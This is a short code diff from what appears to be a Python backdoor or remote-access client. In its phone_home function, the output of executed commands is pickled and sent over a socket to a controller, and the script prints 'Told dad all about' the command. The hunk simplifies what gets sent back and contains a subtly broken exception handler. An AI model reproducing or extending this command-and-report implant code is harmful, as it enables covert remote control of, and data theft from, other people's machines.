@@ -50,11 +50,7 @@ def phone_home():
                     except:
                         FileNotFoundError
                     else:
-                        utctime = time.asctime(time.gmtime())
-                        cmd_return = str(cmd[0]) + ' | '
-                        cmd_return += str(utctime) + ' | ' + str(c)
-                        cmd_return += "\n" + str(execute.stdout) + "\n"
-                        jar = pickle.dumps(cmd_return)
+                        jar = pickle.dumps(execute.stdout)
                         s.sendall(jar)
 
             print("Told dad all about", cmd, "!")
